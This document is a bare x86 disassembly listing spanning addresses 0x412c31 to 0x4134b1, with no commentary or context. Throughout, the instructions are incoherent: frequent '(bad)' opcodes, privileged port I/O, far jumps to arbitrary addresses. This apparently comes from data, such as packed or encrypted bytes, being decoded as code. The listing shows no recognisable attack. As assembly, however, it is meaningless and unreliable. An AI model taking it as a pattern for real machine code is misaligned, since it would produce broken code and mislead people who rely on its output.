  412c31:	bnd jmp 0xb729f407
  412c37:	hlt    
  412c38:	icebp  
  412c39:	mov    al,0xc4
  412c3b:	(bad)  
  412c3c:	repnz inc esp
  412c3f:	fstp   TBYTE PTR [ebp+edi*4-0x10b2a06]
  412c46:	std    
  412c47:	out    0xdb,eax
  412c49:	xlat   BYTE PTR ds:[ebx]
  412c4a:	(bad)  
  412c4b:	fcomp  st(6)
  412c4d:	into   
  412c4e:	jmp    0xeead:0xc3d9eafe
  412c55:	shr    dl,0xe7
  412c58:	(bad)  
  412c59:	mov    cl,0xf4
  412c5b:	mov    dh,0xfb
  412c5d:	jmp    0xd009f618
  412c62:	repz fidivr WORD PTR [ecx-0x5281afd]
  412c69:	hlt    
  412c6a:	xlat   BYTE PTR ds:[ebx]
  412c6b:	(bad)  
  412c6c:	neg    bh
  412c6e:	(bad)  [esi+edi*8]
  412c71:	jmp    0xcbbc:0xb1c6bfcc
  412c78:	ror    dl,cl
  412c7a:	int3   
  412c7b:	leave  
  412c7c:	cmc    
  412c7d:	jmp    0xca05066d
  412c82:	mov    edx,0xf7fde2f0
  412c87:	repnz add eax,ebx
  412c8a:	ffreep st(2)
  412c8c:	fdiv   st(6),st
  412c8e:	iret   
  412c8f:	call   0xccfe2ca3
  412c94:	lods   eax,DWORD PTR ds:[esi]
  412c95:	shl    ebx,0xc1
  412c98:	rcr    cl,0xf0
  412c9b:	enter  0xe5db,0xb5
  412c9f:	retf   
  412ca0:	iret   
  412ca1:	add    bh,BYTE PTR [ecx+edi*4-0x2a033906]
  412ca8:	fcomi  st,st(1)
  412caa:	add    dl,bh
  412cac:	aam    0xc0
  412cae:	out    0xe6,eax
  412cb0:	add    ecx,esp
  412cb2:	ret    0xc4ac
  412cb5:	xlat   BYTE PTR ds:[ebx]
  412cb6:	lods   eax,DWORD PTR ds:[esi]
  412cb7:	(bad)
  412cba:	aad    0xc7
  412cbc:	div    DWORD PTR [esi-0x4b251c3b]
  412cc2:	clc    
  412cc3:	dec    ah
  412cc5:	pop    es
  412cc6:	hlt    
  412cc7:	add    al,0xc6
  412cc9:	out    0xc6,eax
  412ccb:	fdivrp st(6),st
  412ccd:	out    0xfb,al
  412ccf:	adc    eax,DWORD PTR [ebx+ebp*8]
  412cd2:	mov    esi,0xf2c9f7b3
  412cd7:	mov    bh,0xb5
  412cd9:	mov    ch,0xef
  412cdb:	int3   
  412cdc:	shl    ch,1
  412cde:	cmc    
  412cdf:	jmp    0xf8dc:0xf7f4f5d5
  412ce6:	loope  0x412cde
  412ce8:	loope  0x412ced
  412cea:	inc    BYTE PTR [ecx]
  412cec:	loope  0x412cc9
  412cee:	in     eax,dx
  412cef:	add    al,0xe
  412cf1:	add    DWORD PTR [edx-0x2a0c3e57],esi
  412cf7:	icebp  
  412cf8:	xlat   BYTE PTR ds:[ebx]
  412cf9:	retf   0xf0e5
  412cfc:	(bad)  
  412cfe:	into   
  412cff:	clc    
  412d00:	repnz mov esp,0xc7e3dbf4
  412d06:	aad    0xde
  412d08:	aam    0xf0
  412d0a:	lds    edi,FWORD PTR [esi+0x8dce601]
  412d10:	push   es
  412d11:	std    
  412d12:	mov    esp,0xc1decfee
  412d17:	(bad)  
  412d18:	lock leave 
  412d1a:	retf   
  412d1b:	enter  0xf1ed,0xff
  412d1f:	cli    
  412d20:	ret    
  412d21:	mov    esi,0xdad4d8c1
  412d26:	lock int3 
  412d28:	hlt    
  412d29:	loop   0x412d23
  412d2b:	or     eax,ecx
  412d2d:	mov    DWORD PTR [ecx],0xe4ea0605
  412d33:	retf   0xf3ec
  412d36:	int    0xf1
  412d38:	jmp    0x412d20
  412d3a:	(bad)  
  412d3b:	iret   
  412d3c:	into   
  412d3d:	stc    
  412d3e:	cld    
  412d3f:	leave  
  412d40:	(bad)  
  412d42:	mov    bh,0xbc
  412d44:	mov    esi,0xebc0d006
  412d49:	fcomip st,st(5)
  412d4b:	hlt    
  412d4c:	cld    
  412d4d:	or     ebx,ebx
  412d4f:	fcom   DWORD PTR [ebx]
  412d51:	fldcw  WORD PTR [edx-0x1d501a19]
  412d57:	hlt    
  412d58:	hlt    
  412d59:	jmp    0xfc31e50e
  412d5e:	(bad)  
  412d5f:	mov    ebx,0xfee2fbb1
  412d64:	loop   0x412d67
  412d66:	fucom  st(4)
  412d68:	mul    esi
  412d6a:	cli    
  412d6b:	cmc    
  412d6c:	(bad)
  412d6f:	iret   
  412d70:	adc    cl,cl
  412d72:	test   eax,0xddcbc2bc
  412d77:	mov    al,0xc4
  412d79:	icebp  
  412d7a:	mov    ecx,0xeeb6cddf
  412d7f:	in     eax,dx
  412d80:	dec    cl
  412d82:	fstp   TBYTE PTR [ecx-0x18210c20]
  412d88:	(bad)  
  412d8a:	icebp  
  412d8b:	mov    esi,0xe6e8dfc7
  412d90:	loope  0x412d96
  412d92:	shl    DWORD PTR [ebx-0x2f3f1644],0xc0
  412d99:	loope  0x412d80
  412d9b:	jmp    0xc2f5:0xe4cbf6ad
  412da2:	shl    edi,1
  412da4:	sar    ch,cl
  412da6:	int3   
  412da7:	fcmovbe st,st(3)
  412da9:	fst    st(4)
  412dab:	sysret 
  412dad:	jmp    0xb2bfa86
  412db2:	fucom  st(1)
  412db4:	in     al,dx
  412db5:	aad    0xca
  412db7:	fadd   st(0),st
  412db9:	stc    
  412dba:	loope  0x412d8e
  412dbc:	mov    ecx,0xf7d9dbd3
  412dc1:	in     al,dx
  412dc2:	repz loopne 0x412dc7
  412dc5:	mov    eax,0xdec3c6f1
  412dca:	sti    
  412dcb:	out    0x1,al
  412dcd:	aam    0xec
  412dcf:	stc    
  412dd0:	int3   
  412dd1:	loopne 0x412da0
  412dd3:	mov    eax,0xb2b1e9e7
  412dd8:	cmc    
  412dd9:	loope  0x412da7
  412ddb:	loopne 0x412dcc
  412ddd:	in     al,0xbb
  412ddf:	mov    dh,0xcd
  412de1:	shl    BYTE PTR [edi-0x3f380e38],cl
  412de7:	rol    BYTE PTR [ecx+eax*8],cl
  412dea:	cmc    
  412deb:	sti    
  412dec:	out    0xfa,eax
  412dee:	add    eax,0xe10ee105
  412df3:	sar    BYTE PTR [ecx+edx*8-0xf1e4a4e],1
  412dfa:	leave  
  412dfb:	lock out dx,al
  412dfd:	jmp    0x412dbd
  412dff:	jecxz  0x412dc4
  412e01:	ret    
  412e02:	mov    esi,0xe4b8cfdb
  412e07:	fadd   st(1),st
  412e09:	pop    es
  412e0a:	xlat   BYTE PTR ds:[ebx]
  412e0b:	push   es
  412e0c:	test   DWORD PTR [ebx],0xfce0e2e4
  412e12:	loope  0x412dc7
  412e14:	repnz rcl ebp,0xe9
  412e18:	in     eax,0xcd
  412e1a:	out    0xef,al
  412e1c:	out    0xdd,al
  412e1e:	(bad)  
  412e1f:	enter  0xbbcc,0xb7
  412e23:	icebp  
  412e24:	out    0xbd,eax
  412e26:	cli    
  412e27:	not    dl
  412e29:	rol    DWORD PTR ds:0xbdbd609,1
  412e2f:	in     al,0xe0
  412e31:	add    edi,DWORD PTR [esi-0x1918510d]
  412e37:	enter  0xb4ad,0xee
  412e3b:	in     eax,dx
  412e3c:	shr    ebp,cl
  412e3e:	std    
  412e3f:	test   edx,0xfee3fcf9
  412e45:	repnz std 
  412e47:	repnz std 
  412e49:	clc    
  412e4a:	(bad)  
  412e4b:	jecxz  0x412e1c
  412e4d:	or     esp,ecx
  412e4f:	ret    0xffed
  412e52:	mov    edi,0xb1edb3e2
  412e57:	in     eax,0xc8
  412e59:	shl    esi,1
  412e5b:	in     eax,dx
  412e5c:	int3   
  412e5d:	rcl    esi,1
  412e5f:	aam    0xeb
  412e61:	stc    
  412e62:	(bad)  
  412e63:	xlat   BYTE PTR ds:[ebx]
  412e64:	in     eax,dx
  412e65:	sti    
  412e66:	rcl    al,1
  412e68:	loope  0x412e71
  412e6a:	(bad)  
  412e6b:	enter  0xfb0f,0xe0
  412e6f:	fsubrp st(5),st
  412e71:	or     ebp,ebx
  412e73:	retf   0xd6ca
  412e76:	shr    edi,cl
  412e78:	sti    
  412e79:	int3   
  412e7a:	clc    
  412e7b:	int    0xda
  412e7d:	into   
  412e7e:	retf   
  412e7f:	stc    
  412e80:	repz fdivr st(1),st
  412e83:	std    
  412e84:	mov    eax,0xd6d200d9
  412e89:	dec    BYTE PTR [ecx]
  412e8b:	cld    
  412e8c:	in     al,0x3
  412e8e:	loopne 0x412e89
  412e90:	or     ch,cl
  412e92:	stos   DWORD PTR es:[edi],eax
  412e93:	ror    ch,1
  412e95:	enter  0xf0cb,0xda
  412e99:	lock loope 0x412e62
  412e9c:	div    edi
  412e9e:	fcmovbe st,st(0)
  412ea0:	repz lock mov bh,0xee
  412ea4:	into   
  412ea5:	out    0x3,al
  412ea7:	(bad)  
  412ea8:	(bad)  
  412ea9:	cli    
  412eaa:	(bad)  
  412eab:	shr    dl,0xfa
  412eae:	cli    
  412eaf:	cli    
  412eb0:	jmp    0xd1a8:0xe4e2c503
  412eb7:	(bad)  
  412eb8:	mov    ch,0xf3
  412eba:	rol    eax,cl
  412ebc:	(bad)  
  412ebe:	sar    bh,1
  412ec0:	fstp   TBYTE PTR [ebx-0x221c090c]
  412ec6:	int    0xc7
  412ec8:	rol    DWORD PTR [ecx],cl
  412eca:	or     ah,bl
  412ecc:	or     al,bh
  412ece:	or     dh,cl
  412ed0:	jecxz  0x412eb8
  412ed2:	in     al,dx
  412ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ed4:	mul    dl
  412ed6:	mov    esp,0xe8eec6c4
  412edb:	in     eax,0xdf
  412edd:	enter  0xd1ec,0xc3
  412ee1:	stc    
  412ee2:	aam    0xd7
  412ee4:	cmc    
  412ee5:	out    dx,al
  412ee6:	shl    dl,1
  412ee8:	fcmovnu st,st(4)
  412eea:	add    esp,edx
  412eec:	pop    es
  412eed:	(bad)  
  412eef:	(bad)  
  412ef0:	in     eax,0xda
  412ef2:	lods   al,BYTE PTR ds:[esi]
  412ef3:	mov    dh,0xec
  412ef6:	int3   
  412ef7:	out    0xbb,al
  412ef9:	in     al,dx
  412efa:	stc    
  412efb:	rcr    dl,0xf8
  412efe:	shl    ch,1
  412f00:	mov    ah,0xea
  412f02:	icebp  
  412f03:	int    0xd2
  412f05:	fsubrp st(6),st
  412f07:	rcl    esi,cl
  412f09:	fucom  st(6)
  412f0b:	out    0xdf,al
  412f0d:	sti    
  412f0e:	or     al,0xf8
  412f10:	in     al,0xf2
  412f12:	lods   eax,DWORD PTR ds:[esi]
  412f13:	shr    BYTE PTR [esi-0x280c510d],cl
  412f19:	shl    ebp,0xda
  412f1c:	mov    edi,0xf1d4f3f3
  412f21:	mov    eax,0xf3c100db
  412f26:	faddp  st(4),st
  412f28:	add    ebp,ebx
  412f2a:	cli    
  412f2b:	jmp    0x412f28
  412f2d:	aam    0xed
  412f2f:	leave  
  412f30:	push   cs
  412f31:	loope  0x412f1b
  412f33:	(bad)  
  412f34:	in     al,0xa8
  412f36:	leave  
  412f37:	enter  0xc7b0,0xf9
  412f3b:	jmp    0xbac3:0xcad5acad
  412f42:	sar    DWORD PTR [ecx-0x27222642],1
  412f48:	lock aad 0xc5
  412f4b:	retf   
  412f4c:	aam    0xd9
  412f4e:	(bad)  
  412f50:	repnz into 
  412f52:	jmp    0x412f3a
  412f54:	shr    DWORD PTR [ebp-0x93e2e1b],0xca
  412f5b:	jmp    0x412f2d
  412f5d:	int3   
  412f5e:	mov    edx,0xbddceffb
  412f63:	fst    st(6)
  412f65:	fpatan 
  412f67:	fucom  st(5)
  412f69:	push   es
  412f6a:	cmc    
  412f6b:	push   es
  412f6c:	pop    es
  412f6d:	sti    
  412f6e:	add    eax,ecx
  412f70:	push   es
  412f71:	call   0xc526f932
  412f76:	jmp    0xcff4f042
  412f7b:	(bad)  
  412f7d:	lods   al,BYTE PTR ds:[esi]
  412f7e:	retf   0xdcde
  412f81:	rcr    edx,cl
  412f83:	repz iret 
  412f85:	int3   
  412f86:	shl    edx,cl
  412f88:	mul    esi
  412f8a:	add    ecx,edx
  412f8c:	enter  0xdc01,0xfb
  412f90:	(bad)  [edi]
  412f92:	jmp    0xb1ea0055
  412f97:	repnz retf 0xecd5
  412f9b:	retf   0xd3fb
  412f9e:	mov    ecx,0xc1cddabe
  412fa3:	jecxz  0x412f81
  412fa5:	ret    
  412fa6:	aad    0xc2
  412fa8:	in     eax,0xd6
  412faa:	out    0xe1,al
  412fac:	(bad)  
  412fad:	call   0x42f3876
  412fb2:	jmp    0xf22f0e7f
  412fb7:	out    0xb0,eax
  412fb9:	shl    bl,0xe7
  412fbc:	sar    DWORD PTR [ebx-0xe35234a],1
  412fc2:	jmp    0xc13a16a8
  412fc7:	jmp    0x412fcb
  412fc9:	jmp    0xd8dd:0xf9c0e9c6
  412fd0:	in     eax,0xff
  412fd2:	loope  0x412f7a
  412fd4:	fbstp  TBYTE PTR [edi-0x4852194e]
  412fda:	mov    bl,0xef
  412fdc:	dec    esp
  412fde:	repnz jmp 0xf5cc:0xd9effae3
  412fe6:	icebp  
  412fe7:	(bad)
  412fea:	or     ebp,edi
  412fec:	retf   0xfec9
  412fef:	fdiv   st(1),st
  412ff1:	fdivr  DWORD PTR [ebp-0x1d481344]
  412ff7:	int    0xea
  412ff9:	mov    dh,0xb7
  412ffb:	sar    eax,1
  412ffd:	mov    ebx,0xdacac4fb
  413002:	loop   0x412fc6
  413004:	add    esp,ebp
  413006:	fld    QWORD PTR [ebx]
  413008:	add    cl,dl
  41300a:	add    al,0xde
  41300c:	(bad)  
  41300e:	aad    0xc2
  413010:	retf   0xbe13
  413013:	shl    ecx,0xdd
  413016:	mov    dl,0xcd
  413018:	mov    bh,0xf3
  41301a:	in     eax,0xc4
  41301c:	sti    
  41301d:	out    dx,eax
  41301e:	fsubp  st(3),st
  413020:	mov    esi,0xe3cfdae2
  413025:	cld    
  413026:	repz lock loope 0x413031
  41302a:	ret    0xe9d6
  41302d:	in     al,0xec
  41302f:	inc    DWORD PTR [esi]
  413031:	out    dx,al
  413032:	in     al,0xee
  413034:	int3   
  413035:	iret   
  413036:	mov    ebp,0xbbf6d4ed
  41303b:	xlat   BYTE PTR ds:[ebx]
  41303c:	clc    
  41303d:	leave  
  41303e:	fdivr  QWORD PTR [ebx+0xd6d5e9]
  413044:	int3   
  413045:	(bad)  
  413046:	loope  0x413046
  413048:	fdiv   st(1),st
  41304a:	mov    DWORD PTR [ecx],0xdeefe0c5
  413050:	jmp    0xbda8:0xb0c1e811
  413057:	(bad)  
  413058:	mov    ah,0xbb
  41305a:	mov    cl,0xb4
  41305c:	in     eax,dx
  41305d:	(bad)  
  41305e:	fistp  QWORD PTR [edi-0x24472d41]
  413064:	mov    esp,0xdac60103
  413069:	jmp    0xfb19153f
  41306e:	(bad)  
  41306f:	fimul  WORD PTR ds:0xc4cdabcf
  413075:	lods   al,BYTE PTR ds:[esi]
  413076:	iret   
  413077:	sti    
  413078:	mov    cl,0xe2
  41307a:	in     al,0xd2
  41307c:	mov    edi,0xecbfc4bf
  413081:	enter  0xddff,0xe3
  413085:	mov    edi,0xf6bce4fb
  41308a:	mov    edi,0xc901e0d9
  41308f:	jmp    0xe3bd:0xb1e3feec
  413096:	hlt    
  413097:	shr    ch,0xcc
  41309a:	aad    0xcc
  41309c:	out    dx,al
  41309d:	push   ecx
  41309f:	aam    0xca
  4130a1:	clc    
  4130a2:	int3   
  4130a3:	shl    ah,0x2
  4130a6:	ret    0xd9d4
  4130a9:	fcomip st,st(1)
  4130ab:	(bad)  
  4130ad:	add    ebx,eax
  4130af:	stc    
  4130b0:	syscall 
  4130b2:	test   al,0xe5
  4130b4:	mov    ebp,0xd0d1afe9
  4130b9:	out    dx,eax
  4130ba:	sti    
  4130bb:	(bad)  
  4130bc:	(bad)  
  4130bd:	fistp  QWORD PTR [ecx-0x3d45162d]
  4130c3:	fcomi  st,st(6)
  4130c5:	std    
  4130c6:	rcr    cl,cl
  4130c8:	ffreep st(3)
  4130ca:	or     dh,al
  4130cc:	clc    
  4130cd:	pop    es
  4130ce:	retf   
  4130cf:	out    dx,eax
  4130d0:	retf   0xc509
  4130d3:	scas   al,BYTE PTR es:[edi]
  4130d4:	(bad)  
  4130d5:	int    0xad
  4130d7:	in     al,dx
  4130d8:	leave  
  4130d9:	out    dx,eax
  4130da:	fnop   
  4130dc:	out    dx,eax
  4130dd:	into   
  4130de:	sar    esi,1
  4130e0:	mov    esp,0xe0d1bdcd
  4130e5:	add    dl,dl
  4130e7:	add    eax,0xeac1e0ea
  4130ec:	faddp  st(7),st
  4130ee:	or     eax,ebx
  4130f0:	in     al,dx
  4130f1:	clc    
  4130f2:	in     eax,dx
  4130f3:	mov    edi,0xadc7e2bd
  4130f8:	jmp    0xd2332bcd
  4130fd:	mov    dh,0xd8
  4130ff:	enter  0xf0cc,0xf2
  413103:	add    bh,BYTE PTR [esp+esi*8-0x503262f]
  41310a:	jmp    0x3106e3
  41310f:	pop    es
  413110:	fisttp WORD PTR [edi]
  413112:	scas   eax,DWORD PTR es:[edi]
  413113:	fdivrp st(1),st
  413115:	lods   eax,DWORD PTR ds:[esi]
  413116:	scas   eax,DWORD PTR es:[edi]
  413117:	lock mov ebx,0xe9f1b2b2
  41311d:	mov    dh,0xfd
  41311f:	stc    
  413120:	(bad)  
  413122:	jecxz  0x413118
  413124:	fld    QWORD PTR [edi]
  413126:	xlat   BYTE PTR ds:[ebx]
  413127:	in     al,dx
  413128:	fiadd  WORD PTR [ebx]
  41312a:	fcmovb st,st(4)
  41312c:	fsub   st(3),st
  41312e:	in     al,0xe1
  413130:	call   0xa6060021
  413135:	mov    bh,0xe8
  413137:	ror    ecx,1
  413139:	loopne 0x4130ff
  41313b:	lock aam 0xe4
  41313e:	mov    bh,0xd7
  413140:	fcmovnbe st,st(3)
  413142:	call   0xc719f145
  413147:	mov    esi,0xc4fcfac4
  41314c:	imul   ebp
  41314e:	(bad)  
  413150:	or     al,0xb
  413152:	rcr    ch,0xea
  413155:	shl    edx,0xb6
  413158:	in     eax,dx
  413159:	mov    al,0xf8
  41315b:	sar    DWORD PTR [ebx-0x3010447],1
  413161:	fdivr  st(7),st
  413163:	mov    dh,0xfc
  413165:	push   es
  413166:	vpsadbw ymm6,ymm7,ymm0
  41316a:	fcomp  st(5)
  41316c:	xlat   BYTE PTR ds:[ebx]
  41316d:	out    0xa,al
  41316f:	(bad)
  413173:	iret   
  413174:	in     eax,dx
  413175:	shr    BYTE PTR [edi-0x3318133f],cl
  41317b:	fdivr  st,st(0)
  41317d:	(bad)  
  41317e:	iret   
  41317f:	fcmove st,st(4)
  413181:	(bad)  
  413183:	rcr    ch,1
  413185:	add    ah,ch
  413187:	or     edi,DWORD PTR [ebp-0x25f008ff]
  41318d:	out    0xca,al
  41318f:	cld    
  413190:	ror    DWORD PTR [eax],cl
  413192:	test   al,0xed
  413194:	fsubr  st(3),st
  413196:	in     al,0xc3
  413198:	int    0xec
  41319a:	(bad)  
  41319b:	fistp  QWORD PTR [edx-0x291c334b]
  4131a1:	shl    ah,1
  4131a3:	loop   0x413194
  4131a5:	(bad)  
  4131a6:	faddp  st(0),st
  4131a8:	loop   0x41317a
  4131aa:	fiadd  WORD PTR [edi]
  4131ac:	stc    
  4131ad:	retf   0xbda
  4131b0:	fxch   st(4)
  4131b2:	jmp    0x413198
  4131b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131b5:	in     eax,0xaf
  4131b7:	ret    
  4131b8:	ret    0xe7ed
  4131bb:	icebp  
  4131bc:	out    0xf3,eax
  4131be:	lds    esi,FWORD PTR [esi-0x20331512]
  4131c4:	(bad)  
  4131c5:	cmc    
  4131c6:	sti    
  4131c7:	mov    edx,0xfc090b0b
  4131cc:	loope  0x4131a9
  4131ce:	out    0xe2,al
  4131d0:	fcom   st(2)
  4131d2:	shl    ebx,0xef
  4131d5:	rol    cl,0xcb
  4131d8:	jecxz  0x4131d5
  4131da:	retf   
  4131db:	int3   
  4131dc:	in     al,dx
  4131dd:	(bad)  
  4131de:	fidivr DWORD PTR [ebp-0x3dfe0b46]
  4131e4:	(bad)  
  4131e5:	std    
  4131e6:	fcmovnb st,st(6)
  4131e8:	in     al,0xd4
  4131ea:	leave  
  4131eb:	ret    0xacb
  4131ee:	in     al,0xee
  4131f0:	cli    
  4131f1:	int    0xaf
  4131f3:	(bad)
  4131f6:	repz ret 0xc5d2
  4131fa:	clc    
  4131fb:	jmp    0x4131f3
  4131fd:	xlat   BYTE PTR ds:[ebx]
  4131fe:	ror    bh,1
  413200:	sti    
  413201:	fmul   st,st(4)
  413203:	rcr    al,1
  413205:	add    eax,0x1d9d803
  41320a:	cld    
  41320b:	in     eax,0xdd
  41320d:	or     BYTE PTR ds:0xc906050b,al
  413213:	shl    BYTE PTR [edx-0x321c480b],cl
  413219:	mov    ah,0xe5
  41321b:	mov    dh,0xe8
  41321d:	xlat   BYTE PTR ds:[ebx]
  41321e:	out    dx,al
  41321f:	leave  
  413220:	jmp    0xce362a06
  413225:	inc    BYTE PTR [eax]
  413227:	out    0x2,eax
  413229:	add    bh,bh
  41322b:	(bad)  
  41322d:	out    0x6,al
  41322f:	or     cl,cl
  413231:	(bad)  
  413233:	int3   
  413234:	into   
  413235:	out    0xe2,eax
  413237:	(bad)  
  413238:	shr    DWORD PTR [ecx+eiz*8-0x2b224e39],cl
  41323f:	aad    0xd8
  413241:	shl    esi,1
  413243:	add    edx,ebx
  413245:	int3   
  413246:	in     eax,0xe4
  413248:	cmc    
  413249:	loop   0x41320d
  41324b:	jmp    0xf53f2d4f
  413250:	leave  
  413251:	cld    
  413252:	jecxz  0x413226
  413254:	(bad)  
  413255:	out    dx,al
  413256:	mov    dh,0xc1
  413258:	shl    eax,cl
  41325a:	int    0xd4
  41325c:	mov    al,0xd7
  41325e:	jmp    0x41324b
  413260:	loop   0x41322f
  413262:	mov    bh,0xf1
  413264:	loopne 0x41321a
  413266:	aam    0xe3
  413268:	loope  0x41322f
  41326a:	add    dh,al
  41326c:	leave  
  41326d:	(bad)  
  41326e:	fld    QWORD PTR [eax+ecx*8]
  413271:	jecxz  0x413253
  413273:	ret    
  413274:	mov    esp,0xf1d4bdc3
  413279:	out    0xec,al
  41327b:	mov    cl,0xea
  41327d:	retf   0xb2c4
  413280:	rcr    cl,1
  413282:	fdivr  st(2),st
  413284:	sti    
  413285:	fcmovb st,st(5)
  413287:	shl    esi,0xc6
  41328a:	(bad)  
  41328b:	inc    ecx
  41328d:	enter  0xc4c9,0xe2
  413291:	or     eax,0xe0c4ecce
  413296:	fst    st(0)
  413298:	mov    dl,0xd3
  41329a:	repz int3 
  41329c:	mov    dh,0xd8
  41329e:	std    
  41329f:	retf   0xbbbd
  4132a2:	leave  
  4132a3:	fdiv   st(1),st
  4132a5:	(bad)  
  4132a6:	mov    ebp,0xf4e7fceb
  4132ab:	call   0x103e26b9
  4132b0:	out    dx,eax
  4132b1:	fsub   st,st(3)
  4132b3:	int    0xc3
  4132b5:	mov    bl,0xcd
  4132b7:	in     eax,dx
  4132b8:	cli    
  4132b9:	icebp  
  4132ba:	mov    ah,0xfa
  4132bc:	cli    
  4132bd:	mov    esi,0xd2c8cdd3
  4132c2:	(bad)  
  4132c3:	fdivp  st(1),st
  4132c5:	stc    
  4132c6:	loope  0x41329d
  4132c8:	mul    eax
  4132ca:	in     al,0x4
  4132cc:	stc    
  4132cd:	(bad)  
  4132ce:	fsub   st(2),st
  4132d0:	or     edx,DWORD PTR [edx]
  4132d2:	lock jmp 0xc7e6:0xe9edc1f6
  4132da:	mov    al,0xee
  4132dc:	(bad)  
  4132dd:	repz repnz div bh
  4132e1:	enter  0xe3ed,0x1
  4132e5:	in     al,dx
  4132e6:	mul    ch
  4132e8:	repnz fcomp st(5)
  4132eb:	(bad)  
  4132ed:	out    0xed,eax
  4132ef:	add    edx,ebx
  4132f1:	out    0xb3,eax
  4132f3:	lock out 0xee,al
  4132f6:	jecxz  0x4132ba
  4132f8:	mov    bh,0xe7
  4132fa:	fcmovu st,st(7)
  4132fc:	lock out dx,al
  4132fe:	aam    0xf6
  413300:	add    esi,edx
  413302:	ror    eax,cl
  413304:	int3   
  413305:	ret    0x5bb
  413308:	ret    
  413309:	ret    0xbdc
  41330c:	out    0xf,eax
  41330e:	ret    
  41330f:	add    al,0xe9
  413311:	shl    eax,cl
  413313:	test   al,0xd2
  413315:	out    dx,al
  413316:	fadd   st(4),st
  413318:	mov    dh,0xbb
  41331a:	in     al,dx
  41331b:	sti    
  41331c:	mov    ebx,0xb4dbccea
  413321:	loop   0x4132fd
  413323:	ror    dh,cl
  413325:	icebp  
  413326:	shl    bh,1
  413328:	mov    al,0x3
  41332b:	call   0xde2e0c05
  413330:	add    esp,ebp
  413332:	out    dx,al
  413333:	call   0xb729f60a
  413338:	mov    cl,0xe4
  41333a:	rcl    ecx,1
  41333c:	leave  
  41333d:	retf   
  41333e:	mov    edx,0xcddbbbf4
  413343:	std    
  413344:	aam    0xf2
  413346:	sar    esp,0xdc
  413349:	add    eax,0xc0c4ef06
  41334e:	push   es
  41334f:	iret   
  413350:	add    ebp,ebp
  413352:	out    dx,al
  413353:	out    dx,eax
  413354:	mov    esp,0xe7bce4e6
  413359:	leave  
  41335a:	mov    ebx,0xf4b4b0f1
  41335f:	rcl    edx,cl
  413361:	sti    
  413362:	out    dx,al
  413363:	fiadd  DWORD PTR [ebx]
  413365:	fstp   TBYTE PTR [esi+0x9e1f5d1]
  41336b:	xlat   BYTE PTR ds:[ebx]
  41336c:	jmp    0xed1c1a37
  413371:	(bad)  
  413373:	in     al,dx
  413374:	rcl    ebx,cl
  413376:	call   0xd81bea6c
  41337b:	mov    bh,0xc4
  41337d:	retf   0xfcd9
  413380:	repnz jecxz 0x413371
  413383:	loop   0x41338c
  413385:	aam    0xbe
  413387:	aad    0xd4
  413389:	or     bh,cl
  41338b:	ret    0xe0c5
  41338e:	into   
  41338f:	or     eax,0xe0f209f8
  413394:	leave  
  413395:	mov    bl,0xdc
  413397:	shl    bl,cl
  413399:	lods   al,BYTE PTR ds:[esi]
  41339a:	aam    0xae
  41339c:	clc    
  41339d:	mov    ebx,0xd1bdecce
  4133a2:	ret    0xe1ed
  4133a5:	fsub   st,st(6)
  4133a7:	repz cld 
  4133a9:	(bad)  
  4133ab:	dec    DWORD PTR [edx]
  4133ad:	add    ch,al
  4133af:	in     al,0xc1
  4133b1:	icebp  
  4133b2:	ret    
  4133b3:	out    dx,al
  4133b4:	loope  0x41335a
  4133b6:	in     eax,dx
  4133b7:	in     eax,0xda
  4133b9:	repz mov ebx,0xbab6eac4
  4133bf:	fld    QWORD PTR [edx]
  4133c1:	div    ebx
  4133c3:	(bad)  
  4133c4:	mov    ebp,0xd8c7ffda
  4133c9:	cmc    
  4133ca:	xlat   BYTE PTR ds:[ebx]
  4133cb:	(bad)  
  4133cd:	in     eax,dx
  4133ce:	or     eax,0xc0efdc02
  4133d3:	out    0xe4,al
  4133d5:	(bad)  
  4133d6:	ror    esp,cl
  4133d8:	aam    0xd4
  4133da:	int3   
  4133db:	jmp    0x4133b2
  4133dd:	int3   
  4133de:	xlat   BYTE PTR ds:[ebx]
  4133df:	mov    ch,0xcb
  4133e1:	fadd   st(1),st
  4133e3:	ror    ch,1
  4133e5:	loopne 0x4133db
  4133e7:	repnz (bad) 
  4133ea:	add    DWORD PTR [esi-0x30004324],edi
  4133f0:	fmul   st,st(7)
  4133f2:	fsubr  QWORD PTR [esi-0x491c1f4e]
  4133f8:	not    ch
  4133fa:	out    0xc0,al
  4133fc:	jmp    0xdab0:0xf4f8d8f6
  413403:	mov    edx,0xfdf3fbed
  413408:	neg    bl
  41340a:	call   0x13f22f7
  41340f:	call   0xedf02c15
  413414:	out    dx,eax
  413415:	mov    ebp,0xb1f2cdb3
  41341a:	iret   
  41341b:	clc    
  41341c:	repnz mov ah,0xd5
  41341f:	cli    
  413420:	enter  0xddc3,0xf4
  413424:	(bad)  
  413426:	inc    esi
  413428:	(bad)  
  413429:	or     DWORD PTR [ecx],eax
  41342b:	ret    0xe3de
  41342e:	pmulhuw mm0,QWORD PTR [edx]
  413431:	(bad)  
  413433:	repz shl DWORD PTR [edi+edx*8-0x1b170e4d],0xd5
  41343c:	in     al,dx
  41343d:	jmp    0xce110b0f
  413442:	imul   edi
  413444:	sar    ecx,1
  413446:	fcos   
  413448:	shl    al,0xeb
  41344b:	mul    cl
  41344d:	fisttp DWORD PTR [ecx]
  41344f:	std    
  413450:	loop   0x413421
  413452:	icebp  
  413453:	test   al,0xce
  413455:	mov    esp,0xd1b1c3e9
  41345a:	jmp    0xf4fc:0xc5fdc5b9
  413461:	loop   0x413466
  413463:	loope  0x413452
  413465:	add    eax,0xf4f6f2f8
  41346a:	leave  
  41346b:	aam    0xf
  41346d:	add    eax,0xdfc5e2df
  413472:	mov    esi,0xf5e3cced
  413477:	jmp    0xfdb9:0xb0d5c5b4
  41347e:	ror    cl,cl
  413480:	hlt    
  413481:	mov    al,0xf6
  413483:	shr    dh,1
  413485:	in     eax,0xff
  413487:	loope  0x413479
  413489:	add    DWORD PTR [ecx],ecx
  41348b:	push   es
  41348c:	or     BYTE PTR ds:0xfefa05cf,cl
  413492:	repz out 0xec,eax
  413495:	jmp    0xb8e4:0xfaa9c1ae
  41349c:	(bad)
  41349f:	std    
  4134a0:	out    dx,eax
  4134a1:	aam    0xed
  4134a3:	fxch   st(4)
  4134a5:	aad    0x5
  4134a7:	in     al,dx
  4134a8:	xlat   BYTE PTR ds:[ebx]
  4134a9:	jecxz  0x4134a7
  4134ab:	push   es
  4134ac:	hlt    
  4134ad:	out    dx,eax
  4134ae:	aam    0xc8
  4134b0:	iret   
  4134b1:	icebp  
